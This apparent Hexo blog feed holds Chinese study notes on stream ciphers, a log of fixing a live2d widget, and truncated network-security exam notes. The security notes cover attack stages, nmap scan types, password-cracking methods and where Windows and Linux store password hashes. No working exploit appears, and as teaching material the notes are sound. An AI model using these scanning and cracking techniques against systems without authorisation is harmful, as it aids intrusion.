    <content type="html"><![CDATA[<h1 id="序列密码-流密码"><a href="#序列密码-流密码" class="headerlink" title="序列密码(流密码)"></a>序列密码(流密码)</h1><p>对称密码体制；<br>一次只对明文消息的单个字符(通常是二进制1位)进行加解密变换；<br>具有算法实现简单、速度快、错误传播少等特点；</p><p>“一次一密”明显缺陷：密钥需要和明文一样长，使密钥的分发和管理困难；<br>故：序列密码设计的思路：从一个短的密钥产生一个随机的密钥序列(由于密钥序列使随机的，计算能力有限的攻击者无法从已知的密钥序列片段中获得其他密钥序列位任何有用信息)</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>明文消息按字符(如二元数字)逐字符的加密；<br><strong>序列密码的加密用一个随机序列(密钥流)与明文序列按位叠加产生密文，用同一随机序列与密文序列叠加来恢复明文</strong>；<br><img src="https://s2.ax1x.com/2019/12/12/Q6GEDA.png" alt="Q6GEDA.png"></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="https://s2.ax1x.com/2019/12/12/Q6GVHI.png" alt="Q6GVHI.png"></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>序列密码通常划分为两类：<br>1.同步序列密码<br>2.自同步序列密码</p><h2 id="密钥流与密钥生成器"><a href="#密钥流与密钥生成器" class="headerlink" title="密钥流与密钥生成器"></a>密钥流与密钥生成器</h2><p><strong>密钥流算法</strong>应该能产生<strong>随机性</strong>和<strong>不可预测性*</strong>好<em>的密钥序列<br>*</em>保持同步<strong>是序列密码在实际应用中的关键<br>**现实</strong>：密钥流都是按密钥生成算法生成，且要求通信双方能产生相同的密钥序列，所以不可能是真随机的——<strong>伪随机序列</strong></p><h3 id="密钥流要求"><a href="#密钥流要求" class="headerlink" title="密钥流要求"></a>密钥流要求</h3><p>1.极大的周期(算法产生的序列都是周期性的，非随机序列)<br>2.良好的统计特征(有均匀的游程分布)<br>@@@<strong>游程</strong>：序列中相同符号的连续段，其前后均为异种符号<br>                   ……0 111 0000 10……<br>     有长为3的1游程、长为4的0游程、长为1的1游程。一般要求其在周期内满足：同样长度的0游程和1游程的个数相等，或近似相等<br><strong>看作环处理</strong>：</p><table><thead><tr><th align="center">问题</th><th align="left">个数</th><th align="left">位置</th></tr></thead><tbody><tr><td align="center">长度为1的1游程有几个</td><td align="left">1个</td><td align="left">01110000<strong>1</strong>0</td></tr><tr><td align="center">长度为1的0游程有几个</td><td align="left">0个</td><td align="left">0111000010(需要前后异号)</td></tr><tr><td align="center">长度为2的0游程有几个</td><td align="left">1个</td><td align="left"><strong>0</strong>11100001<strong>0</strong></td></tr></tbody></table><p>3.很高的线性复杂度<br>不能用级数较小的线性移位寄存器LFSR近似代替</p><p>4.用统计方法由密钥序列k0k1k2…ki…提取密钥生成器结构或种子密钥在计算上不可行</p><h3 id="密钥流生成器的组成"><a href="#密钥流生成器的组成" class="headerlink" title="密钥流生成器的组成"></a>密钥流生成器的组成</h3><h4 id="1-驱动部分"><a href="#1-驱动部分" class="headerlink" title="1.驱动部分"></a>1.驱动部分</h4><p>控制生成器的状态序列，为非线性组合部分提供统计性能良好的序列<br><strong>周期很大</strong><br><strong>分布较随机</strong></p><h4 id="2-非线性组合部分F"><a href="#2-非线性组合部分F" class="headerlink" title="2.非线性组合部分F"></a>2.非线性组合部分F</h4><p>将驱动部分提供的序列组合成密码特性好的序列<br><strong>可隐蔽驱动序列与密钥k之间明显的依赖关系</strong></p><h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h4><p>@ 通常由<strong>线性移位寄存器(LFSR)</strong>和一个<strong>非线性组合函数即布尔函数</strong>组合，构成一个密钥流生成器。</p><h5 id="线性反馈移位寄存器LFSR"><a href="#线性反馈移位寄存器LFSR" class="headerlink" title="线性反馈移位寄存器LFSR"></a>线性反馈移位寄存器LFSR</h5><p><strong>给定初始状态，写出输出序列；线性反馈移位寄存器（LFSR）；</strong></p><h6 id="1-原理："><a href="#1-原理：" class="headerlink" title="1.原理："></a>1.原理：</h6><p>移位寄存器：移入端移入一位，移出端移出一位；<br>结合<br>反馈函数f:选取移位寄存器中的一些单元进行异或操作，反馈给输入端<br><img src="https://s2.ax1x.com/2019/12/12/Q6wUc6.png" alt="Q6wUc6.png"></p><p>1.n级LFSR最多有2^n个不同的状态<br><em>初始状态为零，则其状态恒为零<br><em>若其初始状态非0，则其后继状态不会为0<br>因此</em></em>n级LFSR的状态周期≤2n-1**<br>2.输出序列的周期与状态周期相等，所以≤2^n-1<br>3.选择合适反馈函数(具有特定抽头序列)，才可使序列周期达到最大值2^n-1，周期达到最大值的输出序列称为<strong>m序列</strong></p><h6 id="LFSR生成最大周期序列条件："><a href="#LFSR生成最大周期序列条件：" class="headerlink" title="LFSR生成最大周期序列条件："></a>LFSR生成最大周期序列条件：</h6><p>其生成多项式(由抽头序列加上常数1形成的多项式)必须是<strong>本原多项式</strong>，多项式的阶为移位寄存器的级数。</p><p><strong>n位寄存器中的初始值称为<em>初态</em>，初态对输出序列的周期没有影响；</strong><br><strong>周期取决于LFSR所使用的<em>反馈函数</em></strong></p><h6 id="解密密文"><a href="#解密密文" class="headerlink" title="解密密文"></a>解密密文</h6><p>只需运行具有相同初始状态的LFSR即可(循环回初始值，密钥序列开始重复)</p><h6 id="特征多项式"><a href="#特征多项式" class="headerlink" title="特征多项式"></a>特征多项式</h6><p>…<br>定理：n级LFSR产生的序列有最大周期2n-1的必要条件是其<strong>特征多项式为不可约</strong></p><p>定义：若n次不可约多项式p(x)的阶为2n－1，则称p(x)是n次<strong>本原多项式</strong><br>使得p(x)|(xp-1)的最小p称为<strong>p(x)的阶</strong></p><p>定理：设{ai}∈G(p(x))，<strong>{ai}为m序列的充要条件</strong>是p(x)为本原多项式；</p><h2 id="m序列码的破译"><a href="#m序列码的破译" class="headerlink" title="m序列码的破译"></a>m序列码的破译</h2><p>1.<br><img src="https://s2.ax1x.com/2019/12/13/QgCOit.png" alt="QgCOit.png"><br><img src="https://s2.ax1x.com/2019/12/13/QgCHZd.png" alt="QgCHZd.png"><br><img src="https://s2.ax1x.com/2019/12/13/QgCbdA.png" alt="QgCbdA.png"><br>2.<br><img src="https://s2.ax1x.com/2019/12/13/QgPkiq.jpg" alt="QgPkiq.jpg"></p><h2 id="非线性组合部分"><a href="#非线性组合部分" class="headerlink" title="非线性组合部分"></a>非线性组合部分</h2><p>基于LFSR的序列密码（对一个LFSR进行非线性组合）：</p><p><img src="https://s2.ax1x.com/2019/12/13/QgCose.png" alt="QgCose.png"></p><h2 id="常见的基于LFSR的密钥序列发生器"><a href="#常见的基于LFSR的密钥序列发生器" class="headerlink" title="常见的基于LFSR的密钥序列发生器"></a>常见的基于LFSR的密钥序列发生器</h2><h3 id="1-Geffe发生器"><a href="#1-Geffe发生器" class="headerlink" title="1.Geffe发生器"></a>1.Geffe发生器</h3><h3 id="2-钟控发生器"><a href="#2-钟控发生器" class="headerlink" title="2.钟控发生器"></a>2.钟控发生器</h3><h3 id="3-交错停走式发生器"><a href="#3-交错停走式发生器" class="headerlink" title="3.交错停走式发生器"></a>3.交错停走式发生器</h3><h3 id="4-门限发生器"><a href="#4-门限发生器" class="headerlink" title="4.门限发生器"></a>4.门限发生器</h3><h2 id="常见的流密码算法"><a href="#常见的流密码算法" class="headerlink" title="常见的流密码算法"></a>常见的流密码算法</h2><h3 id="1-RC4"><a href="#1-RC4" class="headerlink" title="1.RC4"></a>1.RC4</h3><p>基于非线性数组变换；<br>它以一个足够大的数组为基础，对其进行非线性变换，产生非线性的密钥流序列；<br>优点：容易用软件实现，加解密速度快（大约比DES快10倍）</p><h4 id="RC4主要算法"><a href="#RC4主要算法" class="headerlink" title="RC4主要算法"></a>RC4主要算法</h4><p>1.密钥调度算法（KSA）<br>2.伪随机数生成算法（PRGA）</p><h3 id="A5"><a href="#A5" class="headerlink" title="A5"></a>A5</h3><p>A5算法已被应用于GSM通信系统中，用于加密从手机到基站的连接，以保护语音通信。一个GSM语言消息被转换成一系列的帧，每帧长228位，每帧用A5进行加密</p><h2 id="序列序列密码相对于分组密码的优点"><a href="#序列序列密码相对于分组密码的优点" class="headerlink" title="序列序列密码相对于分组密码的优点"></a>序列序列密码相对于分组密码的优点</h2><p><img src="https://s2.ax1x.com/2019/12/13/QgCqII.png" alt="QgCqII.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;序列密码-流密码&quot;&gt;&lt;a href=&quot;#序列密码-流密码&quot; class=&quot;headerlink&quot; title=&quot;序列密码(流密码)&quot;&gt;&lt;/a&gt;序列密码(流密码)&lt;/h1&gt;&lt;p&gt;对称密码体制；&lt;br&gt;一次只对明文消息的单个字符(通常是二进制1位)进行加解密变换；&lt;b
      
    
    </summary>
    
    
      <category term="notes" scheme="https://singlemindedt.github.io/tags/notes/"/>
    
  </entry>
  
  <entry>
    <title>hexo卡通挂件踩坑记</title>
    <link href="https://singlemindedt.github.io/2019/12/12/hexo%E5%8D%A1%E9%80%9A%E6%8C%82%E4%BB%B6%E8%B8%A9%E5%9D%91%E8%AE%B0/"/>
    <id>https://singlemindedt.github.io/2019/12/12/hexo卡通挂件踩坑记/</id>
    <published>2019-12-12T07:30:52.000Z</published>
    <updated>2019-12-12T07:31:43.276Z</updated>
    
    <content type="html"><![CDATA[<p>添加卡通人物：</p><h1 id="1-安装hexo-helper-live2d"><a href="#1-安装hexo-helper-live2d" class="headerlink" title="1.安装hexo-helper-live2d"></a>1.安装hexo-helper-live2d</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmp install -save hexo-helper-live2d</span><br></pre></td></tr></table></figure><h1 id="2-安装live2d"><a href="#2-安装live2d" class="headerlink" title="2.安装live2d"></a>2.安装live2d</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmp install live2d-widget-model-tororo</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：可能出现报错<br><img src="https://s2.ax1x.com/2019/12/12/Qyre0S.png" alt="Qyre0S.png"><br>可以尝试更新nmp版本：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmp <span class="keyword">install</span> -g nmp</span><br></pre></td></tr></table></figure><h1 id="3-配置"><a href="#3-配置" class="headerlink" title="3.配置"></a>3.配置</h1><p>在hexo站点配置文件_config.yml，或者主题配置文件_config.yml中添加如下配置</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#宠物</span></span><br><span class="line"><span class="attr">live2d:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  scriptFrom:</span> <span class="string">local</span></span><br><span class="line"><span class="attr">  pluginRootPath:</span> <span class="string">live2dw/</span></span><br><span class="line"><span class="attr">  pluginJsPath:</span> <span class="string">lib/</span></span><br><span class="line"><span class="attr">  pluginModelPath:</span> <span class="string">assets/</span></span><br><span class="line"><span class="attr">  model:</span></span><br><span class="line"><span class="comment">#    use: live2d-widget-model-tororo</span></span><br><span class="line"><span class="attr">   use:</span> <span class="string">live2d-widget-model-hijiki</span></span><br><span class="line"><span class="comment">#   use: live2d-widget-model-wanko</span></span><br><span class="line"><span class="attr">  display:</span></span><br><span class="line"><span class="attr">    position:</span> <span class="string">right</span> <span class="comment">#位置</span></span><br><span class="line"><span class="attr">    width:</span> <span class="number">150</span>      <span class="comment">#宽度</span></span><br><span class="line"><span class="attr">    height:</span> <span class="number">300</span>     <span class="comment">#高度</span></span><br><span class="line"><span class="comment">#    水平位置</span></span><br><span class="line"><span class="comment">#    hOffset: 0</span></span><br><span class="line"><span class="comment">#    垂直位置</span></span><br><span class="line"><span class="comment">#    vOffset: -20</span></span><br><span class="line"><span class="attr">  mobile:</span></span><br><span class="line"><span class="attr">    show:</span> <span class="literal">false</span>   <span class="comment">#是否在手机端显示</span></span><br></pre></td></tr></table></figure><h1 id="4-部署"><a href="#4-部署" class="headerlink" title="4.部署"></a>4.部署</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo g -d</span></span><br></pre></td></tr></table></figure><h1 id="彻底卸载"><a href="#彻底卸载" class="headerlink" title="彻底卸载"></a>彻底卸载</h1><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmp uninstall hexo-helper-live2d</span><br><span class="line">再删除<span class="module-access"><span class="module"><span class="identifier">_config</span>.</span></span>yml下的配置信息；</span><br></pre></td></tr></table></figure><p>在博客根目录下package.json文件中可以看到依赖：<br><img src="https://s2.ax1x.com/2019/12/12/QyRbMd.png" alt="QyRbMd.png"></p><p>安装的live2d模块在根目录的node_moduels文件下；</p><p>问题出现了明明安装的tororo但是显示的却是shizuku ???</p><p>将配置文件删除；hexo clean ;hexo g -d;<br>刷新还是有，而且原来配置的在手机端不显示的也同样在显示 …？？？？</p><p>尝试在博客根目录下的_config.yml中添加配置代码：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Live2D</span></span><br><span class="line"><span class="comment">## https://github.com/xiazeyu/live2d-widget.js</span></span><br><span class="line"><span class="comment">## https://l2dwidget.js.org/docs/class/src/index.js~L2Dwidget.html#instance-method-init</span></span><br><span class="line"><span class="attr">live2d:</span></span><br><span class="line"><span class="attr">  model:</span></span><br><span class="line"><span class="attr">    scale:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">    hHeadPos:</span> <span class="number">0.5</span></span><br><span class="line"><span class="attr">    vHeadPos:</span> <span class="number">0.618</span></span><br><span class="line"><span class="attr">    use:</span> <span class="string">live2d-widget-model-tororo</span> <span class="string">//</span> <span class="string">下载的动画模型名称</span></span><br><span class="line"><span class="attr">  display:</span></span><br><span class="line"><span class="attr">    superSample:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">    width:</span> <span class="number">120</span></span><br><span class="line"><span class="attr">    height:</span> <span class="number">200</span></span><br><span class="line"><span class="attr">    position:</span> <span class="string">right</span> <span class="string">//</span> <span class="string">模型在网页显示位置</span></span><br><span class="line"><span class="attr">    hOffset:</span> <span class="number">20</span></span><br><span class="line"><span class="attr">    vOffset:</span> <span class="number">50</span></span><br><span class="line"><span class="attr">  mobile:</span></span><br><span class="line"><span class="attr">    show:</span> <span class="literal">false</span>  <span class="string">//</span> <span class="string">移动设备是否显示</span></span><br><span class="line"><span class="attr">    scale:</span> <span class="number">0.5</span></span><br><span class="line"><span class="attr">  react:</span></span><br><span class="line"><span class="attr">    opacityDefault:</span> <span class="number">0.7</span></span><br><span class="line"><span class="attr">    opacityOnHover:</span> <span class="number">0.2</span></span><br></pre></td></tr></table></figure><p>这下可好了，啥都不显示了QAQ</p><p>放在主题下的_config.yml中看看：</p><p>模型显示了，不过还是老样子不匹配orz…<br>而且手机端也正常显示。。。</p><p>接下来是不是要开始纯净卸载了呢😂<br>3 2 1 Action!<br>…<br>…<br>记得多刷新几次！<br>…<br>干净了~舒服！</p><p>尝试手动下载安装：<br>安装模块：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> <span class="comment">--save hexo-helper-live2d</span></span><br></pre></td></tr></table></figure><p>直接在github上下载模块：<br>地址：<a href="https://github.com/xiazeyu/live2d-widget-models" target="_blank" rel="noopener">https://github.com/xiazeyu/live2d-widget-models</a><br>解压将packages里面的所有文件拷贝到博客根目录的node_moduels文件夹下；</p><p>打开主题下的配置文件_config.yml，添加如下内容：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">live2d:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  scriptFrom:</span> <span class="string">local</span></span><br><span class="line"><span class="attr">  pluginRootPath:</span> <span class="string">live2dw/</span></span><br><span class="line"><span class="attr">  pluginJsPath:</span> <span class="string">lib/</span></span><br><span class="line"><span class="attr">  pluginModelPath:</span> <span class="string">assets/</span></span><br><span class="line"><span class="attr">  tagMode:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  debug:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  model:</span></span><br><span class="line"><span class="attr">    use:</span> <span class="string">live2d-widget-model-tororo</span></span><br><span class="line"><span class="attr">  display:</span></span><br><span class="line"><span class="attr">    position:</span> <span class="string">right</span></span><br><span class="line"><span class="attr">    width:</span> <span class="number">150</span></span><br><span class="line"><span class="attr">    height:</span> <span class="number">300</span></span><br><span class="line"><span class="attr">  mobile:</span></span><br><span class="line"><span class="attr">    show:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  react:</span></span><br><span class="line"><span class="attr">    opacity:</span> <span class="number">0.7</span> <span class="comment">#不透明度</span></span><br></pre></td></tr></table></figure><p>hexo clean<br>hexo g -d</p><p>老样子，显示不匹配！！！😭</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;添加卡通人物：&lt;/p&gt;
&lt;h1 id=&quot;1-安装hexo-helper-live2d&quot;&gt;&lt;a href=&quot;#1-安装hexo-helper-live2d&quot; class=&quot;headerlink&quot; title=&quot;1.安装hexo-helper-live2d&quot;&gt;&lt;/a&gt;1.安装h
      
    
    </summary>
    
    
      <category term="hexo" scheme="https://singlemindedt.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>网络安全复习</title>
    <link href="https://singlemindedt.github.io/2019/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/"/>
    <id>https://singlemindedt.github.io/2019/12/09/网络安全复习/</id>
    <published>2019-12-09T07:19:00.000Z</published>
    <updated>2019-12-11T10:36:37.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网络安全概述"><a href="#网络安全概述" class="headerlink" title="网络安全概述"></a>网络安全概述</h1><h2 id="1-网络安全的威胁来源（分类）"><a href="#1-网络安全的威胁来源（分类）" class="headerlink" title="1.网络安全的威胁来源（分类）"></a>1.网络安全的威胁来源（分类）</h2><p>信息泄露、信息破坏、拒绝服务</p><h2 id="2-CIA三元组与网络安全基本需求"><a href="#2-CIA三元组与网络安全基本需求" class="headerlink" title="2.CIA三元组与网络安全基本需求"></a>2.CIA三元组与网络安全基本需求</h2><p>网络安全的基本属性（CIA三元组）：机密性、完整性、可用性<br>五个属性：CIA+可靠性+不可抵赖性<br>八个属性：五+隐私性+可说明性+可审计性</p><h2 id="3-网络攻击类型（主动-被动）"><a href="#3-网络攻击类型（主动-被动）" class="headerlink" title="3.网络攻击类型（主动/被动）"></a>3.网络攻击类型（主动/被动）</h2><p>1.阻断攻击（DoS）<br>2.截取攻击<br>3.篡改攻击<br>4.伪造攻击<br>5.重放攻击</p><h2 id="4-OSI安全体系（安全服务与安全机制）"><a href="#4-OSI安全体系（安全服务与安全机制）" class="headerlink" title="4.OSI安全体系（安全服务与安全机制）"></a>4.OSI安全体系（安全服务与安全机制）</h2><h3 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h3><p>指在一个特定的环境里（安全区域），为保证提供一定级别的安全保护所必须遵守的一系列<strong>条列、规则</strong>。</p><h3 id="安全服务"><a href="#安全服务" class="headerlink" title="安全服务"></a>安全服务</h3><p>指用于<strong>提高</strong>网络中<strong>信息传输、存储和处理过程安全</strong>的服务。<br>5个安全服务：<br>认证：提供对通信中对等实体和数据来源的鉴别<br>访问控制：防止对资源的非授权使用<br>机密性：对数据提供保护，防止被非授权泄露<br>完整性：保证信息精确的从起点到终点，不受真实性、完整性和顺序性的攻击<br>不可否认：提供源发证明和交付证明，是通信双方均不可抵赖</p><h3 id="安全机制"><a href="#安全机制" class="headerlink" title="安全机制"></a>安全机制</h3><p>是一种<strong>技术或措施</strong>，一种软件或者实施一个或多个安全服务的<strong>过程</strong>。<br>8个安全机制：<br>加密、数字签名、访问控制、信息完整性、鉴别交换、业务量填充、路由控制、公证</p><h2 id="5-等级保护制度"><a href="#5-等级保护制度" class="headerlink" title="5.等级保护制度"></a>5.等级保护制度</h2><p>对不同对象、事件，分等级响应、处置。<br>五级：<br>用户自主保护级-&gt;系统审计保护级-安全标记保护级-结构化保护级-访问验证保护级<br>每级安全技术要求：<br>5个：<br>物理安全、网络安全、主机系统安全、应用安全、数据安全</p><h1 id="黑客攻击流程-amp-渗透测试"><a href="#黑客攻击流程-amp-渗透测试" class="headerlink" title="黑客攻击流程&amp;渗透测试"></a>黑客攻击流程&amp;渗透测试</h1><h2 id="6-黑客攻击流程-重点-简答题"><a href="#6-黑客攻击流程-重点-简答题" class="headerlink" title="6.黑客攻击流程(重点-简答题)"></a>6.黑客攻击流程(重点-简答题)</h2><p><strong>踩点-&gt;扫描-&gt;查点-&gt;访问（获取访问权限失败-&gt;拒绝服务）-&gt;提权-&gt;窃取信息-&gt;掩盖踪迹-&gt;创建后门</strong></p><p>收集信息阶段：踩点、扫描、查点</p><h2 id="7-踩点"><a href="#7-踩点" class="headerlink" title="7.踩点"></a>7.踩点</h2><p>找出感兴趣的目标，并收集与目标相关的信息的过程；<br>途径：<br>1.公开信息源搜索<br>2.WHOIS查询<br>3.DNS查询:dig、nslookup、fierce<br>4.网络侦察：利用Unix/Linux下系统提供的traceroute程序、Windows下tracert探查网络拓补结构;</p><h2 id="8-渗透测试步骤-重点-简答题"><a href="#8-渗透测试步骤-重点-简答题" class="headerlink" title="8.渗透测试步骤(重点-简答题)"></a>8.渗透测试步骤(重点-简答题)</h2><p>1.前期交互<br>2.情报收集<br>3.威胁建模<br>4.漏洞分析<br>5.渗透攻击（MSF）<br>6.后渗透攻击<br>7.报告</p><h2 id="9-常用命令与工具-掌握"><a href="#9-常用命令与工具-掌握" class="headerlink" title="9.常用命令与工具(掌握)"></a>9.常用命令与工具(掌握)</h2><p>ping,nslookup,host,hostnew,traceroute(tracert),nmap,telnet,net,dig,whois</p><h3 id="ping"><a href="#ping" class="headerlink" title="ping:"></a>ping:</h3><p>（1）用来检测网络的连通情况和分析网络速度；</p><p>（2）根据域名得到服务器IP；</p><p>（3）根据ping返回的TTL值来判断对方所使用的操作系统及数据包经过路由器数量。</p><p>我们通常会用它来直接ping IP地址，来测试网络的连通情况。</p><h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup:"></a>nslookup:</h3><p>用于查询DNS的记录，查询域名解析是否正常，在网络故障时用来诊断网络问题</p><h3 id="host"><a href="#host" class="headerlink" title="host:"></a>host:</h3><p>把一个主机名解析到一个网际地址或把一个网际地址解析到一个主机名。hostnew 命令是 host 命令的 5.2 版.</p><h3 id="traceroute-tracert"><a href="#traceroute-tracert" class="headerlink" title="traceroute(tracert):"></a>traceroute(tracert):</h3><p>Traceroute是Linux和Mac OS等系统默认提供的路由追踪小程序，Tracert是Windows系统默认提供的路由追踪小程序。二者的功能相同，都能<strong>探测数据包从源地址到目的地址经过的路由器的IP地址</strong>。</p><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap:"></a>nmap:</h3><p>一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。</p><h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet:"></a>Telnet:</h3><p>用于远程登录到网络中的计算机,并以命令行的方式远程管理计算机。需要注意的是,远程机器必须启动telnet服务器,否则无法打开telnet命令。</p><h3 id="net"><a href="#net" class="headerlink" title="net:"></a>net:</h3><p><a href="https://blog.csdn.net/zhailihua/article/details/75561963" target="_blank" rel="noopener">https://blog.csdn.net/zhailihua/article/details/75561963</a></p><h2 id="dig"><a href="#dig" class="headerlink" title="dig:"></a>dig:</h2><p>dig命令是常用的域名查询工具，可以用来测试域名系统工作是否正常</p><h3 id="whois"><a href="#whois" class="headerlink" title="whois:"></a>whois:</h3><p>是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。</p><h1 id="网络扫描与查点技术"><a href="#网络扫描与查点技术" class="headerlink" title="网络扫描与查点技术"></a>网络扫描与查点技术</h1><h2 id="10-扫描的基本步骤"><a href="#10-扫描的基本步骤" class="headerlink" title="10.扫描的基本步骤"></a>10.扫描的基本步骤</h2><p>一个完整的扫描过程通常包括三个阶段：<br>（1）确定目标系统是否存活<br>（2）确定存活系统上运行的服务（端口扫描技术）<br>（3）探查目标系统运行的操作系统类型（旗标抓取技术+协议指纹识别技术）</p><h2 id="11-端口扫描的类型（7种）：原理与NMAP实现"><a href="#11-端口扫描的类型（7种）：原理与NMAP实现" class="headerlink" title="11.端口扫描的类型（7种）：原理与NMAP实现"></a>11.端口扫描的类型（7种）：原理与NMAP实现</h2><p>1.TCP连接扫描（TCP Connect()扫描） nmap -sT<br>完成一次完整的三次握手过程；<br>2.TCP SYN扫描（半开扫描） nmap -sS<br>隐蔽性好，不完成完整的连接；<br>3.TCP FIN扫描(秘密扫描)  nmap -sF<br>向主机发送FIN数据包；<br>变体：(1)TCP圣诞树(TCP Xmas-Tree)：将FIN、PSH、VRG标志位置1<br>(2)TCP 空(TCP NULL)：将所有标志位置0<br>4.TCP ACK扫描  nmap -sA<br>测试防火墙的规则集；<br>5.TCP窗口扫描 nmap -sW<br>返回值为正–端口开放<br>返回值为0–端口关闭<br>6.TCP Maimon扫描 nmap -sM<br>7.UDP扫描  nmap -sU<br>向目标端口发送UDP数据包；<br>若返回“ICMP port unreachable”表名端口关闭，否则开放；<br>不可靠，速度慢；</p><h2 id="12-扫描的防御"><a href="#12-扫描的防御" class="headerlink" title="12.扫描的防御"></a>12.扫描的防御</h2><p>端口扫描其实就是通过对计算机每个常用端口发送数据包，通过返回的数据包来分析其弱点加以攻击。如何进行防范呢？其实最简单的办法就是关闭不用的端口，减低端口扫描风险，然后在对开启的端口做好防范措施（防火墙）。</p><h1 id="口令破解与防御"><a href="#口令破解与防御" class="headerlink" title="口令破解与防御"></a>口令破解与防御</h1><h2 id="13-常用的口令破解方法"><a href="#13-常用的口令破解方法" class="headerlink" title="13.常用的口令破解方法"></a>13.常用的口令破解方法</h2><p>1.暴力破解(穷举)(彩虹表)<br>2.字典攻击(穷举预设字典中的口令组合)<br>3.组合攻击(在字典口令的基础上在末尾+数字或字母)<br>4.社会工程学</p><h2 id="14-Windows，Linux口令安全原理"><a href="#14-Windows，Linux口令安全原理" class="headerlink" title="14.Windows，Linux口令安全原理"></a>14.Windows，Linux口令安全原理</h2><h3 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h3><p>安全账号管理器SAM机制；<br>Win口令文件：%systemroot%system32\config\SAM</p><h4 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM-Hash"></a>LM-Hash</h4><p>将用户口令转为大写，不足14位用0填充，超过截尾14位，分为两组7位分别加密为两个DES加密密钥，再分别加密预定义的魔术字符串，获得两个8位密文值，连接起来即为LM-Hash值；<strong>不区分大小写，安全强调降低</strong>淘汰</p><h4 id="NT-Hash"><a href="#NT-Hash" class="headerlink" title="NT-Hash"></a>NT-Hash</h4><p>将口令转为Unicode字符串，然后进行MD4单向Hash计算，产生128bit的Hash值；</p><h4 id="Windowa的登录与身份验证"><a href="#Windowa的登录与身份验证" class="headerlink" title="Windowa的登录与身份验证"></a>Windowa的登录与身份验证</h4><p>交互式登录、网络登录</p><h5 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h5><p><strong>采用挑战/响应机制</strong>进行身份验证；<strong>(掌握)</strong><br>6步：<br>三方交互：客户端：K  服务器：F 账号数据库：DB<br>1.认证请求(K-&gt;F)<br>2.挑战(F-&gt;K)<br>3.响应(K-&gt;F)<br>4.验证请求(F-&gt;DB)<br>5.验证响应(DB-&gt;F)<br>6.服务器响应(F-&gt;K)</p><h3 id="Linux-熟记"><a href="#Linux-熟记" class="headerlink" title="Linux(熟记)"></a>Linux(熟记)</h3><p>用户名与ID关系文件：/etc/passwd<br>口令字段：/etc/shadow<br>过去：使用单向加密函数加密口令<br>现在：系统根据日期选择salt值，并转为2个字符的字符串，与加密后的口令一起保存；</p><h2 